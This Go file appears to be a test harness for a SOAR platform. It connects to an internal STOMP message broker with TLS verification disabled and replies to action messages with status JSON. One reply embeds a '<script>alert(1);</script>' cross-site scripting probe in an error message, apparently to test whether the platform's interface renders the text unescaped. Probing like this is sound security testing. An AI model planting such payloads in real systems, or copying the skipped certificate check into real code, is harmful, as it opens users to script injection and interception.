package soar

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/go-stomp/stomp/v3"
)

func Connect(login, passcode string) error {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	netConn, err := tls.DialWithDialer(dialer, "tcp", "10.1.12.123:65001", &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return err
	}

	stompConn, err := stomp.Connect(netConn,
		stomp.ConnOpt.Login(login, passcode),
		stomp.ConnOpt.AcceptVersion(stomp.V12),
		stomp.ConnOpt.Host("10.1.12.123"),
	)
	if err != nil {
		log.Printf("STOMP error on connection: %v", err)
		return err
	}
	defer stompConn.Disconnect()

	sub, err := connectionHandler(stompConn)
	if err != nil {
		return err
	}

	for {
		msg := <-sub.C
		if msg.Err != nil {
			log.Printf("Error receiving message: %v", msg.Err)
			continue
		}

		fmt.Printf("Headers:\n")
		fmt.Printf("  %+v\n", msg.Header)
		fmt.Printf("\nBody:\n%s\n\n", string(msg.Body))

		correlationID := msg.Header.Get("correlation-id")
		fmt.Printf("%s", correlationID)

		body1 := `{"message_type": 0, "message": "Starting App Function: 'rest_api_2'", "complete": false}`
		err = stompConn.Send("acks.201.test", "application/json", []byte(body1), stomp.SendOpt.Header("correlation-id", correlationID))
		if err != nil {
			log.Printf("Error sending message 1: %v", err)
		}

		body2 := `{"message_type": 2, "message": "ERROR:\n\n'rest_api_url' is mandatory 🦊<script>alert(1);</script> and is not set. You must set this value to run this function", "complete": true}`
		err = stompConn.Send("acks.201.test", "application/json", []byte(body2), stomp.SendOpt.Header("correlation-id", correlationID))
		if err != nil {
			log.Printf("Error sending message 2: %v", err)
		}
	}
}

func connectionHandler(conn *stomp.Conn) (*stomp.Subscription, error) {
	sub, err := conn.Subscribe("actions.201.test", stomp.AckAuto,
		stomp.SubscribeOpt.Header("activemq.prefetchSize", "50"),
		stomp.SubscribeOpt.Id("repl"),
	)
	if err != nil {
		return nil, err
	}
	return sub, nil
}
